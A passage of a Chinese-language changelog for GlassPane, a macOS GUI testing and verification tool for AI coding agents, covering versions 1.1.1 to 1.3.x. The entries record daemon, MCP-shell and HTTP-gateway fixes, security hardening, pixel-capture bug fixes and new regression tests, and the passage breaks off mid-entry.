- **两条新的"重启"漏句被掐掉**：帧已到达但形状不对（`GP_E_INTERNAL`）不再附带
  `--restore-launchd`，改为给读得出来的检查（同连接发 `gp_probe_status`；`launchctl print` 回读运行
  中 job 的参数）；daemon 侧 `pixel-capture-no-surface`（窗口在屏、被别的东西盖住）有了自己的出路，
  不再落进 `default:` 那句"授予屏幕录制并重启服务"，并由新闸双向对表：分类器能吐出的标签集合 = advice
  分支集合，且除 `screen-recording-denied` 外任何分支都不得出现授予/重启命令词。
- **"已经到界"从此覆盖每个 advertise 了边界的旋钮**，不再只认 `scale`：`gp_observe {maxDepth: 1}` 与
  `gp_recent_reports {limit: 1}` 不再被命令去缩一个自家 zod 会拒的值。
- **HTTP 网关三条发布红线落到代码**：只允许回环地址（非回环在开连接与 bind 之前拒绝并点名被拒的值）；
  bearer token 有长度与熵双门槛（门槛数字写进拒绝理由与 usage，并附一条做得到的生成命令）；bind 失败
  用自己的退出码退出并说清"这个进程没有在服务"。此前"永不监听通配地址"只是注释，`TOKEN=a` 就能守住
  改用户屏幕的面，端口被抢时进程看起来还在服务。
- **`gp_recent_reports` 有了自己的总预算**（等于客户端耐性上限，复用导出的常量而非新数字），超预算时
  点名没取到的 operationId 并返回超时而不是"没有证据"；此前 20 个 id 各自 50 s，最坏能把调用方挂住
  ~1000 s——挂住的正是那条专门用来阻止重复点击的工具。
- **注册表通知不再宣称 daemon 没有状态根覆盖**：`glasspaned --state-dir <root>` 会改变它加载的
  `projects.json`，而 socket 不回这个字段。通知现在明说"本壳看不见、也不从 `$HOME` 猜"，并给出可自查
  的判别（`gp_project_list` 看盘上有什么、`gp_attach {projectId}` 是否 `GP_E_NOT_FOUND`、
  `launchctl print` 读运行中 job 的参数）。新增一条闸同时钉住事实的另一侧：`"stateRoot"` 这个键在
  Swift 里只允许出现在 CLI 的 payload 文件中。
- **`GP_E_PROJECT_LIMIT` 不再命令一个不存在的删除**；`tools/list` 描述里不再出现规格编号，
  证据校验失败也不再让用户"去修 assertion C35"（改为说明两侧 schema 不一致与怎么读出来）。
- **三处永不泛红的对照重写**：探针期限那条两侧同过 `min(·, ceiling)` 因而恒假（改为比较 daemon 侧期限
  并要求"比探针更久的方法"清单逐名）；`history.removeAll()` 不再只看第一处、字段表接受 `let|var` 并
  从结构体 `init` 反推应有字段数；`methodsSentByShell` 现在分别暴露两条产生路径并要求各自非空。
- **新增一类判定：会挂死的对照不是对照**。删掉 token 门槛后那组用例不红而是占住事件循环——所有
  "期待拒绝"的用例改为 try/finally 关掉自己创建出来的 server，反向变异由此从"卡 9 分钟"变成"3 条红"。
- **门禁自身的守卫也修了**：中央 `gate.sh` 对真实 `projects.json` 的基线改为**每次运行自抓**，变动
  计入失败并另存前后两份，退出码与 `failed=` 一致（旧行为是拿 09-23 的哈希天天报 `CHANGED` 却仍然
  `failed=0`，把最贵的一件事降成了噪音）。


## [1.3.0] — 2026-09-26

MCP 专项审查（round 8）与对同批修复自身的三轮复审（round 8b / 8c / 8d）落地。**这一版之前 MCP 面被判定为
"不宜对外发布"**：三条高危都在真实负载下可走到，而当时的门禁一条都不会红；8b/8c/8d 复审的对象是
**这三条修复本身**，又抓到 4 + 1 + 2 条。本版把三条连同中低危与 14+ 条新闸一起收口；判据与残留项写在
`specs/GlassPane_规格修订_2026-09-23_iterate-round4.md` 的「追加三」「追加四」与 `.iterate_decisions.md`。

> 发版说明：`v1.3.0` 的 tag 打在本条目补写之前，所以 GitHub Release 的源码 tarball 与 npm 包里的
> CHANGELOG 是**补写前**的文本（代码本身已含 8c/8d 两条修复，已实测：装出来的 `dist/index.js` 里有
> 迟到 attach 重启链与按 schema 生成的建议）。npm 包不可变，这段差异只在此处披露，不回改历史。

### Fixed — 代理指引不得在忙的时候喊"重启"，也不得诱导重复点击

- **`gp_probe_status` 的调用方期限 15 s → 50 s（客户端耐性上限），且重启指令只挂在
  `GP_E_ENGINE_UNREACHABLE` 上**。守护进程单连接串行，探针排在被它诊断的那个请求**后面**：
  一次合法跑过 15 s 的 `gp_act` 必然让探针超时，而旧文案明写"`gp_probe_status` 也超时就重启"，
  于是代理会去 `--restore-launchd` 一个正在用户屏幕上执行动作的 daemon（SIGTERM 会取消并回滚
  那次动作）。四种探针结局（answered / engine-error / timed-out / unreachable）现在各自陈述
  自己被允许引出什么动作，只有 `unreachable` 给出重启命令。
- **同一形状在握手处也补上**：`hello` 原为 15 s，而懒连接下"触发连接的那一帧"先写，
  所以会话的第一个请求是 `act` 时版本/协议比对必然丢失（只剩一行 stderr）。`hello` 同样抬到
  ceiling。
- **`engine-error` 那句"该码自己的 remedy 永不重启"是未实测的全称断言**，已删除：守护进程给
  `GP_E_AX_UNAVAILABLE` 的 remedy 本身就命令 `--restore-launchd` + `launchctl kickstart -k`。
  现在由测试从 Swift 的 remedy 表里**量出**哪些码命令重启，并要求壳层判据不得禁止它。
- **超时之后才落地的回复，其 `operationId` 现在会写进本会话证据链**。此前只进日志：
  `gp_recent_reports` 对一次真正执行过的 `gp_act` 回答 `GP_E_NO_EVIDENCE … run gp_act first`，
  等于叫代理再点一次。迟到回复带着它被准入时的**链纪元**，纪元不符（中途换过应用）即
  **拒绝写入并说明**，同时给出还能把它取回来的那条路。
- **证据链只在被 attach 的应用真的变化时重新开始**（与守护进程
  `if attachedApp != app { history.removeAll() }` 同条件，身份键覆盖 Swift `AttachedApp` 的
  全部字段）。旧实现每次成功 attach 都清空，于是幂等的同应用 re-attach 会抹掉刚记录的操作。
- **迟到的 `attach` 回复现在也真的执行这条规则**（round 8d）。上一版把 `restart()` 只挂在"非迟到"
  分支：daemon 已按换 app 清了历史，壳层的链纪元却**永不推进**，于是为抓跨应用串档而加的每一道纪元
  判据，在最忙也最容易串档的那条路径上整体失效且零日志。现在"记一条"还是"换 app 重启"由同一个回调
  在**取得 trail turn 之后**决定（8c 的同一形状），没有纪元的迟到帧默认拒绝写入。
- **HTTP 网关不再给出 MCP 面才成立的答案**：`curl` 调用方拿到的指引不再提
  `gp_recent_reports`（该路由恒 404），改指本进程 stderr 与 `GET /v1/evidence/<operationId>`；
  同时真的注册了 note / late-reply 两个汇点，"去读 stderr"这句话不再落空。

### Fixed — 跨语言同源与输入边界

- **`projects.json` 的路径与"不得指向用户主目录"的保护改按守护进程的规则解析主目录**
  （`os.userInfo().homedir`，读口令库而非 `$HOME`）。此前导出一个 `HOME` 就能让两侧读写不同文件、
  并绕过主目录保护。默认 socket 路径**刻意**继续跟随 `$HOME`（否则一个把自己关进沙箱的进程会
  静默接上用户的真 daemon），这一不对称由两条测试钉住，理由写进源码与规格。
- **`gp_attach` 的 `bundleId` 与 `pid` 改为互斥**。守护进程的解析是 pid 优先并**静默忽略**
  `bundleId`，而壳层的 zod 只要求"至少一个"（对外 advertised 的 JSON Schema 早已是 `oneOf`）：
  同时点名两个应用会 attach 到代理没有说的那个并在其界面上下钻。现在两者同给即
  `GP_E_BAD_PARAMS`，一帧都不发。
- **`notifications/cancelled` 不再被静默丢弃**：落一行日志，并明说"本壳无法撤销已经发往
  daemon 的请求，撤销不是撤销回"。
- **超帧回复的建议改由"该工具自己 advertised 的参数表"生成**（round 8d 定形）。中间一版按"这次请求
  恰好带了哪些参数"派生，实测三处错：`gp_observe` 未显式写 `maxDepth` 就被宣判"没有可缩的参数"（它
  明明 advertise 1…10）；唯一能带 `scale` 的 `capture_view` 那一支根本走不到（PNG 预算 base64 后
  3.2 MB < 4 MiB 帧上限，这条不等式现由测试钉住）；`scale` 已在下界 0.1 时还叫它"再调小"——那是
  一条会被壳层自己的校验拒掉的指令。现在界值全部读自工具的 `inputSchema.properties`，到界的旋钮如实
  说明"无可再缩"并改指一条真能走的路（问更小的问题，而非原样重试）。
- **`GP_E_NO_USER_RECORD` / `GP_E_UNKNOWN` 收进错误码单一出口**；`GP_E_PAYLOAD_TOO_LARGE`
  的"壳层专有"注释改口（守护进程枚举里本来就有它）；`McpServer` 的审计会话改为运行时必填，
  缺它即拒绝构造（此前类型必填、运行时可选，未接线看起来完全正常）。
- **引擎侧**："拍不到采集面"不再冒充"窗口没上屏"（新标签 `pixel-capture-no-surface` + 对应的
  可执行下一步），面板证据页的通道分母从写死的 3 改为真实的 6。

### Added — 门禁（每条都做过"撤销修复即红"的因果核对）

- `mcp-shell/test/probe-liveness.test.mjs`：用 mock timers 量真实布防期限（15 s 时探针仍在飞、
  30 s 得到答复、50 s 才结算）+ "任何被发送方法的调用方期限不得超过探针"的表上不变量 +
  "四结局里恰有一处可给出重启命令"。
- `mcp-shell/test/method-table.test.mjs`：从 `FrameCodec.swift` 解析 `EngineMethod`，凡本壳会
  发上线的方法必须有**具名**期限（`audit_ui` / `capture_view` 此前一直在吃缺省 30 s）。
- `mcp-shell/test/attach-identity.test.mjs`：身份键必须覆盖 Swift `AttachedApp` 的每个存储属性，
  且守护进程"按应用变化清历史"这一条件若改写即红。
- `mcp-shell/test/remedy-surface.test.mjs`：错误码"共享 / 壳层专有"的分类与 daemon 枚举双向比对、
  `src/` 内 `GP_E_*` 字面量单一出口、两种接入面各自的 remedy 文本。
- `mcp-shell/test/tools.test.mjs` 两类新用例：**建议不得点名该工具没 advertise 的参数**（对表内每个工具
  都先跑一遍它自己的 `spec.validate`，所以工具新增必填项会让这条变红并点名要改的行，而不是悄悄少测一个
  工具），以及"迟到的 attach 回复重启链"（含幂等 re-attach **不**重启的反例）。
- `mcp-shell/test/support/wire-surface.mjs`：把"本壳会发哪些方法"提出来给两条闸共用 —— "能不能收到迟到
  回复"与"有没有具名期限"必须是同一个答案。
- `probe-liveness.test.mjs` 另加两条：握手期限等于耐性上限、握手活得比触发它的那个请求久。这两条是补的——
  上一版的 `hello` 修复随代码一起提交却**没有任何门禁**，反向变异 `hello: 15_000` 零红才暴露。
- `mcp-shell/test/path-consistency.test.mjs`：真值表的系统树行由 Swift 两份清单**生成**（原为手抄
  5 个名字，清单实际 8+3 项）；4 MiB 帧上限三判据对表；PNG 预算 × 4/3 ≤ 帧上限的不等式。
- `engine/.p6_smoke.py` / `.t9_smoke.py`：`verify_shared_block()` 把"改一处必须同步另一处"这句
  人读注释变成机器闸（漂移、例外被抄平、例外表过期三个方向都能红）。

### 已知边界（不当成已交付）

- `act` 的守护进程侧最坏值是 120 s，而探针最多只能等 50 s：某些真实负载下"探针没答上"必然发生，
  承担这件事的是判据而不是某个期限。
- `installer/cli.js` 仍以 `process.env.HOME` 拼 launchd 的 `--socket-path` 与日志路径（风险区，
  本轮只登记）。
- `notifications/cancelled` 只能记一行：真撤销需要 daemon 侧的取消通道，而方法表是冻结面。
- **本版以 GitHub CI 全绿为发布凭据**（`main @ cc414cd`，7 个 job 全过；装出来的包实测可完成
  `initialize` + `tools/list`，16 个工具与源码表逐名一致）。本机两条端到端闸 `engine/.p6_smoke.py` 与
  `engine/.t9_smoke.py` 在打 tag 时**没有一次可归因的绿**：并行会话把每核 load 顶到 15–33，两条闸按构建
  新鲜度判据自拒并返回 `NOT RUN(2)`（那是正确行为，不是通过）。CI 跑在 ubuntu runner 上，不覆盖真机
  AX / 屏幕录制路径，所以这两面未经端到端验证；机器空下来补跑，若发现问题按 1.3.1 发布修复。

## [1.3.0] 的漏记条目（当时留在 `[未发布]` 名下，实际已随 1.3.0 发出）

下面这一组是 2026-09-25 像素通路修复之后补的判据（`359fd4e` 等），是 `v1.3.0` 的祖先，因此
**已经在 1.3.0 的产物里**；把它们留在这里只为让"哪一版包含什么"有一处真相，不重复计入 1.3.1。


### Fixed — 像素通路修好之后暴露的六条"像测量其实没测"

上一条修复让捕获第一次真的跑到，于是那条路上从没走到的分支全部现形。这一批逐条来自
一次全新视角的复核（报告 20 条，先回代码复核再动手，其中 6 条判为不成立或已修，未采纳）。
下面每一条都做了反向注入验证：**把修复撤销，对应测试必须红**。

- **一次子树没答上不再掐掉整次遍历**。旧实现只有一个 `stopReason`，兄弟循环
  `guard stopReason == nil` 于是把"这一截没看到"执行成"后面全部别看"——而注释写的正好
  相反。真机后果是覆盖率分母里根本没有未走过的子树：看过 5% 也能报 `ratio=1.00`。
  现在 `aborted`（只有预算耗尽才置位）与 `stopReason`（任何不完整都记）分开。
  实测：Finder 一次走查 nodes 298 → **315**，`smallHitTarget` 9 → 15——多出来的不是新规则，
  是以前被丢掉的那些元素。判据抽成纯函数 `AXChannel.walkFailure`，CI 里能跑。
- **尺寸不同的两帧不再返回 `changedPixelRatio = 1`**。窗口在操作中间被 resize 是常见结局，
  "界面变了"成立，"100% 的像素都变了"没人测过。现在抛 `PixelDiffError.geometryChanged`
  带上两边尺寸，证据面记未测量（标签 `pixel-capture-window-resized`）。
- **换窗判据现在比的是"真截到的那个窗口"**。`SCKCapturer` 在 windowID 被回收时会按既有
  语义回退到该 pid 最大的在屏窗口，而 `WindowCapture` 一直携带**请求**的 id——于是可能
  "报告 12 号、像素来自 13 号"，而且上一条修复比的就是这两个请求 id，两边都回退时判据会被绕过。
  采集现在回传实际命中的 `(windowId, frame)`。
- **像素缺失的下一步不再一律答"去授予屏幕录制权限"**（`Classifier.pixelAbsentNextStep`）。
  通路坏着的时候这条分支永远走不到，修好之后它成了常路：换窗 / resize / 没有窗口 / 超时
  全被指去系统设置。现在按已成文的成因标签分支，认不出来就让人去读 reason 原文，绝不猜成席位。
- **成因分类的顺序改成"具体成因先于席位词"**。像素 reason 里大段是 Apple 的
  `localizedDescription`，`denied` / `permission` 出现在那种句子里不等于屏幕录制没给。
- **CGWindowList 少 layer 字段时不再放行**（`isAppWindowLayer(nil) == false`）。"读不到就算通过"
  正是把这条通路弄死十天的同一类错误，而这里放行会一路放行到桌面/菜单条层。
- 另外三条同样按"不许发明主张"处理：PNG 静默降采样失败时如实报告**实际应用**的倍率
  （`appliedScale`，由像素数倒推）；MCP 壳层不再在引擎没回答时补 `persisted: false`
  （缺这个字段就拒帧——"不落盘"是协议主张，不是壳层可以填的默认值）；`map()` 的
  像素降级句从"默认值"改成"调用方自己给"，因为全仓唯一把像素拒绝抛成错误的调用方是
  `capture_view`，它没有 pixelDiff 可降级，gp_verify 走证据包那条路。

### Added / fixed — 文档与诊断跟着改口径

- `gp_audit_ui` 返回体新增 `complete` 与 `stopReason`：README 早就写着"遍历没走完会带
  `complete: false`"，而这两个字段**从来没上过线**——不完整只藏在一条 finding 的文字里。
  截断（`overlapScanTruncated`）有一等布尔值，不完整没有，这个不对称补齐。
- `noInteractiveElements` 在遍历未完成时不再声称"整棵树里没有可交互角色"，只说"本次走过的
  部分里没有"：一条没走过的子树不配得出关于这个应用的结论。
- SECURITY（双语）：屏幕录制席位的两个消费者写清楚（像素比对 + `gp_capture_view`）；
  "唯一移动像素的通路"改成"唯一会把屏幕像素搬出本机的通路"，与 `.gputrace` 只写本地不冲突。
- 真机诊断：`SCKCapturerDiagnosticTests` 的目标 pid 曾写死 `706`，开机就失效，从此再没绿过，
  而它的红被记成了"daemon 缺屏幕录制席位"（P1 规格 §注 3、smoke.md 观察 3 都抄了那条）。
  现在每次现找候选，找不到就如实 skip；同时新增 `RealWindowCandidates`（判据与产品同源）。
  本机的红不再被解释成结论。
- 视觉通道流水线自证改紧：窗口改用 sRGB 纯红，中心像素阈值 r>0.9 / g<0.08 / b<0.08
  （旧版容忍 g<0.35，而它自己记录的实测值 g=0.15 其实来自色彩空间转换——那等于"只要不是绿的都算过"）。
  现在实测 `r=1.0 g=0.0 b=0.0`，640x400。清理 `defer` 移到窗口出现**之前**登记。
- 测试：`swift test` 650 全绿、mcp-shell 176 全绿。新增/改写的判据包括帧预算的
  **带信封**测量（真实字段集除 payload 外的字节数 + base64 上界 < 4 MB，且留 >10% 余量）、
  `capture_view` 的 scale 范围走真实协议入口（旧测试把范围字面量抄进测试里调校验函数，
  `Dispatcher` 改成 `0.01...2.0` 也照样绿）、未挂接时不得给出席位指引。

### Fixed — 像素通路从来没有真的跑通过（2026-09-15 起）

`AXChannel` 读 CGWindowList 时把键名写死成 `"PID"` 与 `"Bounds"`，而系统真正发出来的键是
`kCGWindowOwnerPID` / `kCGWindowBounds`。于是窗口查找**在任何真机上都返回 nil**，
`captureWindow()` 永远抛 "no on-screen window owned by pid N"，`pixelDiff` 自引擎第一笔提交起
恒为缺失、T6 恒 `INCONCLUSIVE`。它一路全绿是因为：那条 remedy 说的"没有窗口，权限也修不了"
听起来永远合理，而这段逻辑是私有实例方法——只在有窗口的 GUI 会话里才可能被走到。
README 里"数值化像素验证"这条主张，在此之前从未被交付过。

- 键名改为直接取 CoreGraphics 常量，且窗口挑选拆成**纯函数**并由单测覆盖（写错键名现在要么
  编译不过要么测试红，不再静默失效）。
- 顺带补层规则，否则修好键名的第一次截图就会把**桌面图片**当成应用窗口：负层是桌面/墙纸/
  程序坞底片，≥20 是菜单条/通知中心——拿它们算像素差是把壁纸的变化记成"界面变了"，
  比"没测到"更糟。
- **修复后才暴露的判据缺口**：前后两次截的不是同一个窗口号（操作让应用换了前台窗口）时，
  跨窗口的比值仍然落在 0...1、看起来完全像一次正常测量，但它不是"这次操作改变了界面"的证据。
  现在这条通路报 `pixel-capture-window-changed` 的未测量，标签仍由同一个分类函数生成。
  `engine/.p6_smoke.py` 的像素豁免集同步登记了这个标签（枚举集合，不是"任意 reason"）。
- 真机证明（`GLASSPANE_LAYOUT_DIAG=1` 的 opt-in 诊断）：测试进程自己开一张纯红窗口，走产品的
  同一条 `captureWindow()` → `PngEncoding` 通路截回来，得到 640×400 / 8983 字节的 PNG，
  解码后中心像素 r=1.0 g=0.15 b=0.0 —— 像素通路第一次"知道该截到什么"，而不只是"没报错"。
  外来窗口那条分支在本次上下文仍测不到（当前 Space 上没有别的在屏应用窗口，且规格早已记录
  daemon 的屏幕录制席位独立于测试进程），诊断会如实打印 `NO CANDIDATE` 而不是假装通过。
- 测试：`AXWindowLookupTests` 5 例（键名必须等于 CoreGraphics 常量、按真机字典形状取窗口、
  层规则、零尺寸窗口跳过、畸形 bounds 不猜值）+ 1 例换窗判据（含"同窗口号必须照常给出数字"
  的对照组）。反向验证：注入旧键名 → 4 条红；关掉换窗判据 → 那条假证据
  （`changedPixelRatio=0.25, windowId=12`，而第二次截的其实是 13 号窗口）如期暴露。

### Added — 显式视觉审查通道

- `gp_capture_view`（引擎方法 `capture_view`，工具面 15 → **16**）：把挂接窗口编成一张 PNG，
  作为 MCP `image` content 交给**用户自己的**模型，用来判规则判不了的东西（整体观感、
  "这看着不对"、没有无障碍树的自绘控件）。
- 三条设计约束，都写进了 SECURITY（双语）：
  1. **引擎不落盘**，且**没有 `path` 参数**——由模型选输出路径等于在协议里开一个屏幕内容驱动的
     任意文件写入口。报告类工具能指定路径是因为它们是文本，图像不是。
  2. 暴露面不可撤销：图像进入会话，就会落到模型服务商保留的一切里，与 `gp_observe` 的 AX 树同级，
     只是换成像素。用过它的会话要按"那窗口当时的画面已被截走"对待。
  3. 摘要与图像同发（尺寸/字节数/scale/`persisted: false`）：模型只看图时没人记得它被 0.6 缩过，
     而"我看清了"与"我看清的是缩过的版本"是两个结论。
- 尺寸受 socket 帧上限硬约束：`FrameCodec.maxFrameBytes = 4 MB`，base64 又放大 4/3，
  故 PNG 预算定在 2.4 MB；超限报 `GP_E_PAYLOAD_TOO_LARGE` 并附**建议倍率**，而不是悄悄降采样——
  悄悄降会让模型以为它看清了。`scale` 合法区间 0.1–1，越界在参数校验层就拒（0.05 的图是
  "看着像看过、其实满屏马赛克"）。
- 新增 `PngEncoding`（ImageIO 编码 + 等比降采样）；`ToolResult.content` 加宽为
  `text | image` 联合类型，只为此一个工具开。
- 测试：Swift `CaptureViewTests` 9 例（PNG 签名自证、scale 换算、超限拒并给倍率、
  倍率算术的精确值（旧写法 `.rounded(.down) * 10 / 10` 会把任何建议塌成 0.1，反向注入验证过
  这条断言能红）、**按它自己给的建议倍率重试必须真能装下**、
  **默认预算必须容得下 base64 膨胀与 JSON 信封**这条不变式、引擎返回形状、
  捕获被拒时绝不回空白图且 remedy 不得借用 gp_verify 的 pixelDiff 口径）；
  mcp-shell 4 例（image+摘要、透传引擎拒绝、
  无图帧报错、越界 scale 本地拦下）。
- `[待真机]` 未在有屏幕录制授权的进程里跑过端到端：本机的诊断进程只有辅助功能授权，
  走的正是"被拒 → 如实报错"那条分支。

### Changed — `gp_audit_ui` 的输出按真机数据收紧

真机跑 Finder 一次性倒出 49 条 finding，其中 36 条是同一个分段控件的"自我重叠"。这份改动
是为了让审计结果**能被读完**，而不是为了让数字好看：

- 返回体新增 `ruleCounts`（每条规则的完整计数），`findings` 每条规则只留前 5 条样本，并补一条
  `findingsAggregated` 说明"被截的是样本，不是计数"。
- 同父且同角色的可交互元素不再互相判为遮挡（分段控件/单选组的子元素共享矩形是设计如此）。
  判据必须同时看父路径与角色：只看父路径会连根层的两个真控件一起豁免——单测当场抓到过一次。
- `tinyHitTarget` 更名 `smallHitTarget`，文案写明 44pt 的出处是 iOS 触控 HIG、对 Mac 工具条偏严
  （真机 Finder 因此报了 9 条）。它是一条线索而非裁决：密集界面应传自己的 `minHitTargetPt`。
- 无障碍读取失败的原因文本不再拼在"trying to"后面（`trying to walking children failed` 这类
  不成句的输出会让人怀疑整条通道是模板造的）。成因词不变，`kAXError` 码照旧原样带出。

### Added — 界面可操作性与几何

- `gp_audit_ui`（引擎方法 `audit_ui`，工具面 14 → **15**）：一次只读的几何遍历 + 确定性规则，
  回答"这个界面是不是能用"。阻塞级 = 零尺寸的可交互元素、中心落在窗口外的元素；提示级 =
  命中目标小于 44pt（可用 `minHitTargetPt` 覆盖）、被窗口裁切、两个可交互目标重叠超过小者 50%
  （启发式，无障碍树没有层级顺序，只能报形状冲突）、整棵树无可交互角色。
- 新增 `engine/Sources/GlassPaneEngine/AXGeometry.swift`：`AxFrame` / `GeometryRead` /
  `AxGeometryNode` / `AxGeometrySnapshot`。**几何不进入 `AxNode`，因此不进入 `TreeDigest`**——
  树摘要一旦掺进位置尺寸，一次 hover 或一段动画就会让"这次操作是否改变了界面"回答"改变了"。
- `GeometryRead` 是三态（`measured` / `absent` / `unread`）而不是 `frame: AxFrame?`：
  "应用明确不给几何"和"这次没读到"是两件事，混成一个 nil 就会把没看到的算进通过。
- 判定值多了 `insufficient`，且优先级高于 `pass`：几何覆盖率为 0 或 measured/total < 0.8 时
  不许报干净；重叠扫描超出 300 目标配对预算被截断时，会自己留下 `overlapScanTruncated`
  finding 并且不再可能给出 `pass`。空树判 `insufficient`，不判干净。
- `RuntimeChannel` 新增 `geometrySnapshot(maxDepth:)` 协议成员，**不给默认实现**：新的 channel
  形态必须正面回答能不能读几何，不能靠继承一个"返回空"把能力假装存在。
- 新增 `ParamValidation.optDouble`（与 `optInt` 同判据：布尔不当数字收、越界即拒、非有限拒）。
- 测试：`UILayoutAuditTests` 18 例（含"量不到就不许通过""窗口未知时不许凭空判越界"
  "未知角色不报目标过小""截断不换 pass"），走 `ScriptedChannel`，不依赖活的 AX 目标，
  因此进 CI；`dispatch.test.mjs` 增加 3 例（参数转发、越界值与未知参数在本地拦下、
  不落到引擎）。`[待真机]` 真实应用上的几何覆盖率与规则误报率尚未测过——
  单元测试只证明规则本身按设计工作，不证明某个具体界面。


一次面向陌生读者的文档重审：原文把 GlassPane 写成"让 AI 证明它说了什么"的诚实性工具，
这偏离了立项动机。按 `specs/GlassPane_5.8_项目综述文档.md` 自己的定位改回来——它是 **macOS 上给
AI 编程代理用的 GUI 测试与验证层**：代理已经能做静态半场（构建/审查/单元测试），缺的是运行时半场
（构建 → 到达状态 → 操作 → 观察 → 诊断 → 修复 → 重验），而常见的替代方案"截图 → 视觉理解 → 坐标操作"
既不能断言也不能归因、不能重复、不能撤销。

- 新增"为什么不是截图"对照表（元素级定位、结构化差异、数值像素测量、归因强度、可重复、成本、回滚、
  审计留痕），并如实写出代价的另一面：视觉判断（审美、无树内容）仍归视觉模型，GlassPane 负责测量。
- 新增"它做不到什么"：不能无头跑（需登录 GUI 会话）、SwiftUI 拖拽会话合成不出（实测）、
  仅 7 个无障碍动词（不写控件值、不发合成 HID，故自由文本输入不在范围内）、
  目标应用不暴露无障碍树时结构验证受限、`strong` 归因需应用内嵌探针配合。
- README 加 npm 下载量徽章（`npm/dm` 两包，实测 shields.io 返回 200）；示例 tag 更新为 v1.1.1。
- 双语补齐：`SECURITY.md`、`CONTRIBUTING.md` 由中文单腿改为英文主 + `*.zh-CN.md` 镜像，
  章节 1:1 对齐；翻译过程中按代码收紧两处被写过头的主张（探针 pid 校验、事件 tap 的位置），
  并把"测试绝不可指向真实 ~/.glasspane"写成贡献者硬规则（对应 projects.json 被覆盖事故）。
- 新增 `scripts/check-doc-links.mjs` 与 CI `docs` 任务：对外 9 份文档的相对链接、页内/跨页锚点、
  双语成对性一次体检（当前 183 条仓库内链接 0 死链）；命令同步登记进
  `iterate.config.yaml` 的 `validation.commands.docs` 与 `ITERATE.md` 门禁清单。

关于 `v0.1.0` 之前的历史：仓库在 2026-09-22 之前不存在任何 git tag，也不存在可用的版本号，因此那段时间按 P0…P6
规格阶段作为里程碑分节记录，不追溯伪造版本号。所有日期取自 `git log`，每条 bullet 可回溯到其给出的 commit hash 或
`specs/` 正文；两者都给不出来的内容已被删除。

- 真机诊断 `GeometryAuditDiagnosticTests`（`GLASSPANE_LAYOUT_DIAG=1` 才跑，无权限/无 GUI 会话干净跳过）
  抓到一个合成用例永远抓不到的缺陷：第一版每个元素 role/title/identifier/position/size 全读，
  在真实应用上 10 秒无障碍预算被击穿、整次审计**颗粒无收**（还观察到 wall time 明显大于宣称的
  预算）。两处修正：① 只读 role + 几何，title 仅对可交互角色读（"哪个按钮点不到"才需要名字）；
  ② 预算耗尽改为带着已测部分返回并置 `complete=false` + `stopReason`，审计据此留下
  `geometryScanIncomplete` 且不允许给出 `pass`——"要么全有要么报错"与大界面天然不兼容。

## [1.2.0] — 2026-09-25

### Added — feature-gap 四维精简审查落地

承接 1.1.2 之后的一次"优先级审查 + 功能缺口"复核（round gap），确认既有 `gp_export_evidence` /
`gp_recent_reports` / daemon `--evidence-stats` / `--recipe-validate` 已覆盖的基线后，本轮补齐四项缺口：

- **HTTP/REST transport（新增 `glasspane-http` 入口）**。`mcp-shell` 新开一个 HTTP gateway：token
  经 `GLASSPANE_HTTP_TOKEN` 注入（缺失即退出），仅绑定 127.0.0.1，处理 SIGINT/SIGTERM 干净退出。
  新增 `/v1/stats` 与 `/v1/recipes/validate`；对无 daemon socket 通道的路径返回 `GP_HTTP_NOT_PROVIDED`。
- **证据趋势统计卡**。设置/面板新增证据统计视图，输出分布与 `==` 计数（见下条的越界归并）。
- **配方校验 + 模板编辑器**。RecipesTab 支持模板编辑，校验走 daemon 的 `--recipe-validate` 语义。

### Fixed — 第二轮代码优先审查（正确性 / 安全 / 发布链路）

- **http-gateway 发布链路缺失（阻断发版）**。此前 bundle 单入口会删掉非 index.js，且无独立 CLI 入口、
  测试消费 tsc dist 而非 bundle，导致"测试绿但发布丢功能"且 CI 拦不住。本轮新增独立
  `http-gateway-cli.ts` 入口、bundle 三入口、bundle smoke 门禁。
- **证据 id 无上限 → DoS**。`MAX_EVIDENCE_IDS` 收敛到 20。
- **token 长度探测**。改为 sha256 + `timingSafeEqual`，去掉按长度提前返回的分支。
- **多余路径段触发真实 act**。路径段拆分后先 404，而不是透传到 act。
- **绕过契约校验的 `LAST_EVIDENCE` 透传**。`last_evidence` 改走 `parseEvidenceFrame` 校验后再进入。
- **证据统计越界 circuitBreakerLevel 丢失**。越界 level 归入显式"其他(不识别)" bucket，分布与 `==` 计数含盖。
- **recipe 临时文件权限 / TOCTOU**。临时文件用 0600 + `O_EXCL` + `O_NOFOLLOW` + UUID。
- **校验结果过期覆盖**。校验 token 门控（递增 token），防止慢校验覆盖新结果；验证期间禁用模板/刷新按钮。

## [1.1.2] — 2026-09-25

### Fixed — R6 遗留四项收口

承接 1.1.1 的 iterate 复审（r1–r4b），本轮把决策日志里标记"仍开着"的四项逐个落地，
版本线从 1.1.1 升至 1.1.2。以下每项都配套了能满足"撤销即红"的测试。

- **面板人读面缺席渲染**。`EvidenceTabView` 此前对 `stateDiff/crash/handlerProbe` 缺席直接无卡、
  `responsiveness` 整块不渲染——"没测到长得像没事"。新增六通道缺席/已测判定的唯一纯函数
  `PanelChannelFields`，各自渲染中文"不可用"卡而非消失。
- **probe-status surface 闸形制收紧**。裸 `includes(key)` 会让短键命中无关散文造成假绿；改为
  反引号 ``` `key` ``` 形制匹配，并核实 description 里 15 个发布键（含 `attachedHasProbe`、
  `longSession` 两处真漏）全部有包裹。
- **path-consistency 以语义而非字形判据**。不再匹配 `for…where…hasPrefix(x+"/")` 的字形，
  改为读 Swift 侧实现断言"子树匹配 + ownability 兜底的存在与可达"，并禁止旧的 `.contains(`
  等值匹配回来；等价重构不假红。
- **双采集失败标签归并**。`no capture surface available` 此前落入 `pixel-capture-failed`
  被当作应用缺陷；现在归并为既有环境边界标签 `pixel-capture-no-onscreen-window`，并同步
  `.p6_smoke.py` 的不可用标签容忍集注释。

## [1.1.1] — 2026-09-23

在 1.1.0 纳入基础设施审计后，本迭代把 iterate 复审（r1–r4b）与既有主线的各类收口合并进 main，并统一推送。
版本从 `1.1.0` 升至 `1.1.1`；发布前按单一版本线全员对齐，四包（根 `@glasspane/monorepo` / `glasspane-install` /
`glasspane-mcp` / `@iterate/kernel`）与引用位点统一到 `1.1.1`。

### Added

- **iterate 复审收口合入**。`iterate/full-review-20260922`（r1–r4b 六回合审查）并入 `main`，解决 engine 源码/测试、
  bridge、`iterate.config.yaml` 等 14 处冲突；两侧成果共存（如 bridge 的 `SEND_SOCK_TIMEOUT_S=10.0` 与
